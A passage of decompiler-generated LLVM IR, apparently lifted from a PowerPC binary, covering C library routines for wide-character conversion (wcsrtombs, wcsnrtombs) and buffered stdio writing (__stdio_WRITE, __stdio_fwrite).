  store i32 %v2_1000fce8, i32* %stack_var_-36, align 4
  store i32 268500216, i32* @lr, align 4
  %v0_1000fcf4 = call i32 @__GI_wcsnrtombs()
  %v3_1000fcf8 = icmp eq i32 %v0_1000fcf4, 0
  br i1 %v3_1000fcf8, label %dec_label_pc_1000fd00, label %dec_label_pc_1000fd04

dec_label_pc_1000fd00:                            ; preds = %dec_label_pc_1000fce8
  br label %dec_label_pc_1000fd04

dec_label_pc_1000fd04:                            ; preds = %dec_label_pc_1000fce8, %dec_label_pc_1000fd00
  %v0_1000fd10 = phi i32 [ %v0_1000fcf4, %dec_label_pc_1000fce8 ], [ 1, %dec_label_pc_1000fd00 ]
  ret i32 %v0_1000fd10

; uselistorder directives
  uselistorder label %dec_label_pc_1000fd04, { 1, 0 }
  uselistorder label %dec_label_pc_1000fce8, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000fd14 = load i32, i32* @r6, align 4
  store i32 %v0_1000fd14, i32* @r7, align 4
  %v0_1000fd18 = load i32, i32* @r5, align 4
  store i32 %v0_1000fd18, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000fd20 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000fd20

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000fd24 = load i32, i32* @r3, align 4
  %v3_1000fd24 = icmp eq i32 %v0_1000fd24, 0
  %v0_1000fd28 = load i32, i32* @lr, align 4
  store i32 %v0_1000fd28, i32* %r0.global-to-local, align 4
  br i1 %v3_1000fd24, label %dec_label_pc_1000fd50, label %dec_label_pc_1000fd38

dec_label_pc_1000fd38:                            ; preds = %entry
  %v1_1000fd38 = load i32, i32* @r4, align 4
  %v4_1000fd38 = icmp eq i32 %v0_1000fd24, %v1_1000fd38
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000fd38, label %dec_label_pc_1000fd44, label %dec_label_pc_1000fd7c

dec_label_pc_1000fd44:                            ; preds = %dec_label_pc_1000fd38
  %v2_1000fd48 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000fd48, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fd7c

dec_label_pc_1000fd50:                            ; preds = %entry
  %v2_1000fd4811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000fd4811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000fd7c

dec_label_pc_1000fd5c:                            ; preds = %dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge, %dec_label_pc_1000fd9c.preheader
  %v0_1000fd5c = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000fd68 = inttoptr i32 %v0_1000fd5c to i32*
  store i32 84, i32* %v2_1000fd68, align 4
  %v0_1000fde0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000fddc

dec_label_pc_1000fd70:                            ; preds = %dec_label_pc_1000fdac
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000fdcc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000fdc8

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fd44, %dec_label_pc_1000fd38, %dec_label_pc_1000fd50
  %v2_1000fdac7 = phi i32 [ %v2_1000fd48, %dec_label_pc_1000fd44 ], [ %v0_1000fd24, %dec_label_pc_1000fd38 ], [ %v2_1000fd4811, %dec_label_pc_1000fd50 ]
  %v0_1000fd7c = load i32, i32* @r5, align 4
  %v1_1000fd7c = load i32, i32* @r6, align 4
  %v3_1000fd7c = icmp ugt i32 %v0_1000fd7c, %v1_1000fd7c
  br i1 %v3_1000fd7c, label %dec_label_pc_1000fd84, label %dec_label_pc_1000fd88

dec_label_pc_1000fd84:                            ; preds = %dec_label_pc_1000fd7c
  store i32 %v1_1000fd7c, i32* @r5, align 4
  br label %dec_label_pc_1000fd88

dec_label_pc_1000fd88:                            ; preds = %dec_label_pc_1000fd7c, %dec_label_pc_1000fd84
  %v0_1000fd94 = phi i32 [ %v0_1000fd7c, %dec_label_pc_1000fd7c ], [ %v1_1000fd7c, %dec_label_pc_1000fd84 ]
  %v1_1000fd88 = add i32 %v0_1000fd94, 1
  store i32 %v1_1000fd88, i32* %r0.global-to-local, align 4
  %v0_1000fd8c = load i32, i32* @r4, align 4
  %v1_1000fd8c = inttoptr i32 %v0_1000fd8c to i32*
  %v2_1000fd8c = load i32, i32* %v1_1000fd8c, align 4
  store i32 %v2_1000fd8c, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fd94, i32* %r9.global-to-local, align 4
  store i32 %v0_1000fd94, i32* %ctr.global-to-local, align 4
  %v2_1000fdc43 = icmp eq i32 %v0_1000fd94, 0
  br i1 %v2_1000fdc43, label %dec_label_pc_1000fdc8, label %dec_label_pc_1000fd9c.preheader

dec_label_pc_1000fd9c.preheader:                  ; preds = %dec_label_pc_1000fd88
  %v1_1000fd9c16 = inttoptr i32 %v2_1000fd8c to i32*
  %v2_1000fd9c17 = load i32, i32* %v1_1000fd9c16, align 4
  store i32 %v2_1000fd9c17, i32* %r0.global-to-local, align 4
  %v1_1000fda018 = add i32 %v2_1000fd8c, 4
  store i32 %v1_1000fda018, i32* %r11.global-to-local, align 4
  %v2_1000fda420 = icmp ugt i32 %v2_1000fd9c17, 127
  br i1 %v2_1000fda420, label %dec_label_pc_1000fd5c, label %dec_label_pc_1000fdac.lr.ph

dec_label_pc_1000fdac.lr.ph:                      ; preds = %dec_label_pc_1000fd9c.preheader
  %extract.t = trunc i32 %v2_1000fd9c17 to i8
  br label %dec_label_pc_1000fdac

dec_label_pc_1000fdac:                            ; preds = %dec_label_pc_1000fdac.lr.ph, %dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge
  %v2_1000fd9c23.off0 = phi i8 [ %extract.t, %dec_label_pc_1000fdac.lr.ph ], [ %extract.t24, %dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge ]
  %v2_1000fdac22 = phi i32 [ %v2_1000fdac7, %dec_label_pc_1000fdac.lr.ph ], [ %v2_1000fdbc, %dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge ]
  %v3_1000fdac = inttoptr i32 %v2_1000fdac22 to i8*
  store i8 %v2_1000fd9c23.off0, i8* %v3_1000fdac, align 1
  %v0_1000fdb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fdb0 = urem i32 %v0_1000fdb0, 256
  store i32 %v1_1000fdb0, i32* %r0.global-to-local, align 4
  %v3_1000fdb4 = icmp eq i32 %v1_1000fdb0, 0
  br i1 %v3_1000fdb4, label %dec_label_pc_1000fd70, label %dec_label_pc_1000fdbc

dec_label_pc_1000fdbc:                            ; preds = %dec_label_pc_1000fdac
  %v0_1000fdbc = load i32, i32* @r3, align 4
  %v1_1000fdbc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fdbc = add i32 %v1_1000fdbc, %v0_1000fdbc
  store i32 %v2_1000fdbc, i32* @r3, align 4
  %v0_1000fdc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fdc0 = add i32 %v0_1000fdc0, -1
  store i32 %v1_1000fdc0, i32* %r9.global-to-local, align 4
  %v0_1000fdc4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fdc4 = add i32 %v0_1000fdc4, -1
  store i32 %v1_1000fdc4, i32* %ctr.global-to-local, align 4
  %v2_1000fdc4 = icmp eq i32 %v1_1000fdc4, 0
  br i1 %v2_1000fdc4, label %dec_label_pc_1000fdc8, label %dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge

dec_label_pc_1000fdbc.dec_label_pc_1000fd9c_crit_edge: ; preds = %dec_label_pc_1000fdbc
  %v0_1000fd9c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fd9c = inttoptr i32 %v0_1000fd9c.pre to i32*
  %v2_1000fd9c = load i32, i32* %v1_1000fd9c, align 4
  store i32 %v2_1000fd9c, i32* %r0.global-to-local, align 4
  %v1_1000fda0 = add i32 %v0_1000fd9c.pre, 4
  store i32 %v1_1000fda0, i32* %r11.global-to-local, align 4
  %v2_1000fda4 = icmp ugt i32 %v2_1000fd9c, 127
  %extract.t24 = trunc i32 %v2_1000fd9c to i8
  br i1 %v2_1000fda4, label %dec_label_pc_1000fd5c, label %dec_label_pc_1000fdac

dec_label_pc_1000fdc8:                            ; preds = %dec_label_pc_1000fdbc, %dec_label_pc_1000fd88, %dec_label_pc_1000fd70
  %v0_1000fdcc = phi i32 [ %v0_1000fdcc.pre, %dec_label_pc_1000fd70 ], [ %v2_1000fdac7, %dec_label_pc_1000fd88 ], [ %v2_1000fdbc, %dec_label_pc_1000fdbc ]
  %v2_1000fdc8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000fdc8, i32* %r0.global-to-local, align 4
  %v4_1000fdcc = icmp eq i32 %v0_1000fdcc, %v2_1000fdc8
  br i1 %v4_1000fdcc, label %dec_label_pc_1000fdd8, label %dec_label_pc_1000fdd4

dec_label_pc_1000fdd4:                            ; preds = %dec_label_pc_1000fdc8
  %v0_1000fdd4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fdd4 = load i32, i32* @r4, align 4
  %v2_1000fdd4 = inttoptr i32 %v1_1000fdd4 to i32*
  store i32 %v0_1000fdd4, i32* %v2_1000fdd4, align 4
  br label %dec_label_pc_1000fdd8

dec_label_pc_1000fdd8:                            ; preds = %dec_label_pc_1000fdc8, %dec_label_pc_1000fdd4
  %v0_1000fdd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fdd8 = load i32, i32* @r5, align 4
  %v2_1000fdd8 = sub i32 %v1_1000fdd8, %v0_1000fdd8
  store i32 %v2_1000fdd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000fddc

dec_label_pc_1000fddc:                            ; preds = %dec_label_pc_1000fd5c, %dec_label_pc_1000fdd8
  %v0_1000fde0 = phi i32 [ %v0_1000fde0.pre, %dec_label_pc_1000fd5c ], [ %v2_1000fdd8, %dec_label_pc_1000fdd8 ]
  store i32 %v0_1000fd28, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fde0

; uselistorder directives
  uselistorder i32 %v1_1000fdc4, { 1, 0 }
  uselistorder i32 %v2_1000fdbc, { 0, 2, 1 }
  uselistorder i32 %v1_1000fdb0, { 1, 0 }
  uselistorder i32 %v0_1000fd94, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000fdac7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_1000fddc, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdac, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd88, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd7c, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000fdf0 = load i32, i32* @lr, align 4
  store i32 %v0_1000fdf0, i32* %r0.global-to-local, align 4
  %v0_1000fdfc = load i32, i32* @r5, align 4
  store i32 %v0_1000fdfc, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000fdfc, i32* @r31, align 4
  %v3_1000fe103 = icmp eq i32 %v0_1000fdfc, 0
  store i32 %v0_1000fdfc, i32* @r27, align 4
  br i1 %v3_1000fe103, label %dec_label_pc_1000feb8, label %dec_label_pc_1000fe20

dec_label_pc_1000fe20:                            ; preds = %entry, %dec_label_pc_1000fe40
  %v0_1000fe30 = phi i32 [ %v2_1000fe40, %dec_label_pc_1000fe40 ], [ %arg2, %entry ]
  %v1_1000fe20.in = phi i32 [ %v2_1000fe44, %dec_label_pc_1000fe40 ], [ %v0_1000fdfc, %entry ]
  %v1_1000fe20 = icmp sgt i32 %v1_1000fe20.in, 0
  br i1 %v1_1000fe20, label %dec_label_pc_1000fe2c, label %dec_label_pc_1000fe24

dec_label_pc_1000fe24:                            ; preds = %dec_label_pc_1000fe20
  br label %dec_label_pc_1000fe2c

dec_label_pc_1000fe2c:                            ; preds = %dec_label_pc_1000fe20, %dec_label_pc_1000fe24
  %v0_1000fe2c = load i32, i32* @r30, align 4
  %v1_1000fe2c = add i32 %v0_1000fe2c, 4
  %v2_1000fe2c = inttoptr i32 %v1_1000fe2c to i32*
  %v3_1000fe2c = load i32, i32* %v2_1000fe2c, align 4
  store i32 268500536, i32* @lr, align 4
  %v3_1000fe34 = call i32 @__libc_write(i32 %v3_1000fe2c, i32 %v0_1000fe30)
  %v1_1000fe38 = icmp slt i32 %v3_1000fe34, 0
  br i1 %v1_1000fe38, label %dec_label_pc_1000fe4c, label %dec_label_pc_1000fe40

dec_label_pc_1000fe40:                            ; preds = %dec_label_pc_1000fe2c
  %v0_1000fe40 = load i32, i32* @r29, align 4
  %v2_1000fe40 = add i32 %v0_1000fe40, %v3_1000fe34
  store i32 %v2_1000fe40, i32* @r29, align 4
  %v1_1000fe44 = load i32, i32* @r31, align 4
  %v2_1000fe44 = sub i32 %v1_1000fe44, %v3_1000fe34
  store i32 %v2_1000fe44, i32* @r31, align 4
  %v3_1000fe10 = icmp eq i32 %v2_1000fe44, 0
  store i32 %v2_1000fe44, i32* @r27, align 4
  br i1 %v3_1000fe10, label %dec_label_pc_1000fe10.dec_label_pc_1000feb8.loopexit_crit_edge, label %dec_label_pc_1000fe20

dec_label_pc_1000fe4c:                            ; preds = %dec_label_pc_1000fe2c
  %v0_1000fe4c = load i32, i32* @r30, align 4
  %v1_1000fe4c = add i32 %v0_1000fe4c, 8
  %v2_1000fe4c = inttoptr i32 %v1_1000fe4c to i32*
  %v3_1000fe4c = load i32, i32* %v2_1000fe4c, align 4
  store i32 %v3_1000fe4c, i32* %r11.global-to-local, align 4
  %v1_1000fe50 = add i32 %v0_1000fe4c, 12
  %v2_1000fe50 = inttoptr i32 %v1_1000fe50 to i32*
  %v3_1000fe50 = load i32, i32* %v2_1000fe50, align 4
  store i32 %v3_1000fe50, i32* %r0.global-to-local, align 4
  %v1_1000fe54 = inttoptr i32 %v0_1000fe4c to i16*
  %v2_1000fe54 = load i16, i16* %v1_1000fe54, align 2
  %v2_1000fe58 = sub i32 %v3_1000fe50, %v3_1000fe4c
  store i32 %v2_1000fe58, i32* %r0.global-to-local, align 4
  %v5_1000fe58 = icmp eq i32 %v2_1000fe58, 0
  %v1_1000fe5c = or i16 %v2_1000fe54, 8
  store i16 %v1_1000fe5c, i16* %v1_1000fe54, align 2
  br i1 %v5_1000fe58, label %dec_label_pc_1000fe4c.dec_label_pc_1000feb4_crit_edge, label %dec_label_pc_1000fe68

dec_label_pc_1000fe4c.dec_label_pc_1000feb4_crit_edge: ; preds = %dec_label_pc_1000fe4c
  %v0_1000feb4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000feb4

dec_label_pc_1000fe68:                            ; preds = %dec_label_pc_1000fe4c
  %v0_1000fe68 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fe68 = load i32, i32* @r31, align 4
  %v3_1000fe68 = icmp ugt i32 %v0_1000fe68, %v1_1000fe68
  br i1 %v3_1000fe68, label %dec_label_pc_1000fe68.dec_label_pc_1000fe74_crit_edge, label %dec_label_pc_1000fe70

dec_label_pc_1000fe68.dec_label_pc_1000fe74_crit_edge: ; preds = %dec_label_pc_1000fe68
  %v0_1000fe74.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000fe74

dec_label_pc_1000fe70:                            ; preds = %dec_label_pc_1000fe68
  store i32 %v0_1000fe68, i32* @r27, align 4
  br label %dec_label_pc_1000fe74

dec_label_pc_1000fe74:                            ; preds = %dec_label_pc_1000fe68.dec_label_pc_1000fe74_crit_edge, %dec_label_pc_1000fe70
  %v0_1000fe74 = phi i32 [ %v0_1000fe74.pre, %dec_label_pc_1000fe68.dec_label_pc_1000fe74_crit_edge ], [ %v0_1000fe68, %dec_label_pc_1000fe70 ]
  store i32 %v0_1000fe74, i32* %ctr.global-to-local, align 4
  %v2_1000fe80.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fe78

dec_label_pc_1000fe78:                            ; preds = %dec_label_pc_1000fe9c, %dec_label_pc_1000fe74
  %v2_1000fe80 = phi i32 [ %v1_1000fe9c, %dec_label_pc_1000fe9c ], [ %v2_1000fe80.pre, %dec_label_pc_1000fe74 ]
  %v0_1000fe78 = load i32, i32* @r29, align 4
  %v1_1000fe78 = inttoptr i32 %v0_1000fe78 to i8*
  %v2_1000fe78 = load i8, i8* %v1_1000fe78, align 1
  %v3_1000fe78 = zext i8 %v2_1000fe78 to i32
  store i32 %v3_1000fe78, i32* %r0.global-to-local, align 4
  %v1_1000fe7c = add i32 %v0_1000fe78, 1
  store i32 %v1_1000fe7c, i32* @r29, align 4
  %v3_1000fe80 = inttoptr i32 %v2_1000fe80 to i8*
  store i8 %v2_1000fe78, i8* %v3_1000fe80, align 1
  %v0_1000fe84 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fe84 = urem i32 %v0_1000fe84, 256
  store i32 %v1_1000fe84, i32* %r0.global-to-local, align 4
  %v3_1000fe88 = icmp eq i32 %v1_1000fe84, 10
  br i1 %v3_1000fe88, label %dec_label_pc_1000fe90, label %dec_label_pc_1000fe9c

dec_label_pc_1000fe90:                            ; preds = %dec_label_pc_1000fe78
  %v0_1000fe90 = load i32, i32* @r30, align 4
  %v1_1000fe90 = inttoptr i32 %v0_1000fe90 to i16*
  %v2_1000fe90 = load i16, i16* %v1_1000fe90, align 2
  %v3_1000fe90 = zext i16 %v2_1000fe90 to i32
  store i32 %v3_1000fe90, i32* %r0.global-to-local, align 4
  %v1_1000fe94 = and i32 %v3_1000fe90, 256
  %v3_1000fe94 = icmp eq i32 %v1_1000fe94, 0
  br i1 %v3_1000fe94, label %dec_label_pc_1000fe9c, label %dec_label_pc_1000fe90.dec_label_pc_1000fea4_crit_edge

dec_label_pc_1000fe90.dec_label_pc_1000fea4_crit_edge: ; preds = %dec_label_pc_1000fe90
  %v0_1000fea8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fea4

dec_label_pc_1000fe9c:                            ; preds = %dec_label_pc_1000fe90, %dec_label_pc_1000fe78
  %v0_1000fe9c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe9c = add i32 %v0_1000fe9c, 1
  store i32 %v1_1000fe9c, i32* %r11.global-to-local, align 4
  %v0_1000fea0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fea0 = add i32 %v0_1000fea0, -1
  store i32 %v1_1000fea0, i32* %ctr.global-to-local, align 4
  %v2_1000fea0 = icmp eq i32 %v1_1000fea0, 0
  br i1 %v2_1000fea0, label %dec_label_pc_1000fe9c.dec_label_pc_1000fea4_crit_edge, label %dec_label_pc_1000fe78

dec_label_pc_1000fe9c.dec_label_pc_1000fea4_crit_edge: ; preds = %dec_label_pc_1000fe9c
  %v0_1000fea4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fea4

dec_label_pc_1000fea4:                            ; preds = %dec_label_pc_1000fe90.dec_label_pc_1000fea4_crit_edge, %dec_label_pc_1000fe9c.dec_label_pc_1000fea4_crit_edge
  %v0_1000fea8 = phi i32 [ %v1_1000fe9c, %dec_label_pc_1000fe9c.dec_label_pc_1000fea4_crit_edge ], [ %v0_1000fea8.pre, %dec_label_pc_1000fe90.dec_label_pc_1000fea4_crit_edge ]
  %v0_1000fea4 = phi i32 [ %v0_1000fea4.pre, %dec_label_pc_1000fe9c.dec_label_pc_1000fea4_crit_edge ], [ %v0_1000fe90, %dec_label_pc_1000fe90.dec_label_pc_1000fea4_crit_edge ]
  %v1_1000fea4 = add i32 %v0_1000fea4, 8
  %v2_1000fea4 = inttoptr i32 %v1_1000fea4 to i32*
  %v3_1000fea4 = load i32, i32* %v2_1000fea4, align 4
  store i32 %v3_1000fea4, i32* %r0.global-to-local, align 4
  %v2_1000fea8 = add i32 %v0_1000fea4, 16
  %v3_1000fea8 = inttoptr i32 %v2_1000fea8 to i32*
  store i32 %v0_1000fea8, i32* %v3_1000fea8, align 4
  %v0_1000feac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000feac = load i32, i32* %r11.global-to-local, align 4
  %v2_1000feac = sub i32 %v1_1000feac, %v0_1000feac
  store i32 %v2_1000feac, i32* %r0.global-to-local, align 4
  %v1_1000feb0 = load i32, i32* @r31, align 4
  %v2_1000feb0 = sub i32 %v1_1000feb0, %v2_1000feac
  store i32 %v2_1000feb0, i32* @r31, align 4
  br label %dec_label_pc_1000feb4

dec_label_pc_1000feb4:                            ; preds = %dec_label_pc_1000fe4c.dec_label_pc_1000feb4_crit_edge, %dec_label_pc_1000fea4
  %v0_1000feb4 = phi i32 [ %v0_1000feb4.pre, %dec_label_pc_1000fe4c.dec_label_pc_1000feb4_crit_edge ], [ %v2_1000feb0, %dec_label_pc_1000fea4 ]
  %v1_1000feb4 = load i32, i32* @r28, align 4
  %v2_1000feb4 = sub i32 %v1_1000feb4, %v0_1000feb4
  store i32 %v2_1000feb4, i32* @r28, align 4
  br label %dec_label_pc_1000feb8

dec_label_pc_1000fe10.dec_label_pc_1000feb8.loopexit_crit_edge: ; preds = %dec_label_pc_1000fe40
  %v0_1000febc.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000feb8

dec_label_pc_1000feb8:                            ; preds = %entry, %dec_label_pc_1000fe10.dec_label_pc_1000feb8.loopexit_crit_edge, %dec_label_pc_1000feb4
  %v0_1000febc = phi i32 [ %v2_1000feb4, %dec_label_pc_1000feb4 ], [ %v0_1000febc.pre.pre, %dec_label_pc_1000fe10.dec_label_pc_1000feb8.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000fdf0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000febc

; uselistorder directives
  uselistorder i32 %v0_1000fea4, { 1, 0 }
  uselistorder i32 %v1_1000fea0, { 1, 0 }
  uselistorder i32 %v1_1000fe9c, { 0, 2, 1 }
  uselistorder i32 %v1_1000fe84, { 1, 0 }
  uselistorder i32 %v2_1000fe44, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000fe40, { 1, 0 }
  uselistorder i32 %v3_1000fe34, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000feb8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000feb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fea4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe74, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe20, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000fed0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000feec = load i16, i16* %arg3, align 2
  %v1_1000fef0 = and i16 %v3_1000feec, 512
  %v3_1000fef0 = icmp eq i16 %v1_1000fef0, 0
  br i1 %v3_1000fef0, label %dec_label_pc_1000fef8, label %dec_label_pc_10010004

dec_label_pc_1000fef8:                            ; preds = %entry
  %v2_1000fef8 = add i32 %tmp, 4
  %v3_1000fef8 = inttoptr i32 %v2_1000fef8 to i32*
  %v4_1000fef8 = load i32, i32* %v3_1000fef8, align 4
  %v2_1000fefc = add i32 %tmp, 16
  %v3_1000fefc = inttoptr i32 %v2_1000fefc to i32*
  %v4_1000fefc = load i32, i32* %v3_1000fefc, align 4
  store i32 %v4_1000fefc, i32* @r3, align 4
  %v3_1000ff00 = icmp eq i32 %v4_1000fef8, -2
  %v2_1000ff04 = add i32 %tmp, 12
  %v3_1000ff04 = inttoptr i32 %v2_1000ff04 to i32*
  %v4_1000ff04 = load i32, i32* %v3_1000ff04, align 4
  %v2_1000ff0c = sub i32 %v4_1000ff04, %v4_1000fefc
  br i1 %v3_1000ff00, label %dec_label_pc_1000ff0c, label %dec_label_pc_1000ff3c

dec_label_pc_1000ff0c:                            ; preds = %dec_label_pc_1000fef8
  %v3_1000ff14 = icmp ult i32 %v2_1000ff0c, %arg2
  br i1 %v3_1000ff14, label %dec_label_pc_1000ff1c, label %dec_label_pc_1000ff20

dec_label_pc_1000ff1c:                            ; preds = %dec_label_pc_1000ff0c
  br label %dec_label_pc_1000ff20

dec_label_pc_1000ff20:                            ; preds = %dec_label_pc_1000ff0c, %dec_label_pc_1000ff1c
  %storemerge = phi i32 [ %v2_1000ff0c, %dec_label_pc_1000ff1c ], [ %arg2, %dec_label_pc_1000ff0c ]
  %v0_1000ff24 = phi i32 [ %v2_1000ff0c, %dec_label_pc_1000ff1c ], [ %arg2, %dec_label_pc_1000ff0c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000ff24, i32* @r5, align 4
  store i32 268500780, i32* @lr, align 4
  %v0_1000ff28 = call i32 @memcpy()
  %v0_1000ff2c = load i32, i32* @r30, align 4
  %v1_1000ff2c = add i32 %v0_1000ff2c, 16
  %v2_1000ff2c = inttoptr i32 %v1_1000ff2c to i32*
  %v3_1000ff2c = load i32, i32* %v2_1000ff2c, align 4
  %v1_1000ff30 = load i32, i32* @r31, align 4
  %v2_1000ff30 = add i32 %v1_1000ff30, %v3_1000ff2c
  store i32 %v2_1000ff30, i32* %v2_1000ff2c, align 4
  br label %dec_label_pc_10010024

dec_label_pc_1000ff3c:                            ; preds = %dec_label_pc_1000fef8
  %v3_1000ff40 = icmp ult i32 %v2_1000ff0c, %arg2
  br i1 %v3_1000ff40, label %dec_label_pc_1000ffe0, label %dec_label_pc_1000ff48

dec_label_pc_1000ff48:                            ; preds = %dec_label_pc_1000ff3c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268500820, i32* @lr, align 4
  %v0_1000ff50 = call i32 @memcpy()
  %v0_1000ff54 = load i32, i32* @r30, align 4
  %v1_1000ff54 = inttoptr i32 %v0_1000ff54 to i16*
  %v2_1000ff54 = load i16, i16* %v1_1000ff54, align 2
  %v1_1000ff58 = add i32 %v0_1000ff54, 16
  %v2_1000ff58 = inttoptr i32 %v1_1000ff58 to i32*
  %v3_1000ff58 = load i32, i32* %v2_1000ff58, align 4
  %v1_1000ff5c = and i16 %v2_1000ff54, 256
  %v3_1000ff5c = icmp eq i16 %v1_1000ff5c, 0
  %v1_1000ff60 = load i32, i32* @r29, align 4
  %v2_1000ff60 = add i32 %v1_1000ff60, %v3_1000ff58
  store i32 %v2_1000ff60, i32* %v2_1000ff58, align 4
  br i1 %v3_1000ff5c, label %dec_label_pc_10010024, label %dec_label_pc_1000ff6c

dec_label_pc_1000ff6c:                            ; preds = %dec_label_pc_1000ff48
  %v0_1000ff6c = load i32, i32* @r28, align 4
  %v0_1000ff74 = load i32, i32* @r29, align 4
  store i32 268500860, i32* @lr, align 4
  %v4_1000ff78 = call i32 @memrchr(i32 %v0_1000ff6c, i32 10, i32 %v0_1000ff74, i32 %v2_1000ff60)
  %v3_1000ff7c = icmp eq i32 %v4_1000ff78, 0
  br i1 %v3_1000ff7c, label %dec_label_pc_10010024, label %dec_label_pc_1000ff84

dec_label_pc_1000ff84:                            ; preds = %dec_label_pc_1000ff6c
  %v0_1000ff84 = load i32, i32* @r30, align 4
  store i32 %v0_1000ff84, i32* @r3, align 4
  store i32 268500876, i32* @lr, align 4
  %v0_1000ff88 = call i32 @__stdio_wcommit()
  %v3_1000ff8c = icmp eq i32 %v0_1000ff88, 0
  br i1 %v3_1000ff8c, label %dec_label_pc_10010024, label %dec_label_pc_1000ff94

dec_label_pc_1000ff94:                            ; preds = %dec_label_pc_1000ff84
  %v0_1000ff94 = load i32, i32* @r29, align 4
  %v3_1000ff94 = icmp ugt i32 %v0_1000ff94, %v0_1000ff88
  %v0_1000ff88.v0_1000ff98 = select i1 %v3_1000ff94, i32 %v0_1000ff88, i32 %v0_1000ff94
  store i32 %v0_1000ff88.v0_1000ff98, i32* @r31, align 4
  %v2_1000ffa4 = sub i32 %v0_1000ff94, %v0_1000ff88.v0_1000ff98
  %v0_1000ffac = load i32, i32* @r28, align 4
  %v2_1000ffac = add i32 %v0_1000ffac, %v2_1000ffa4
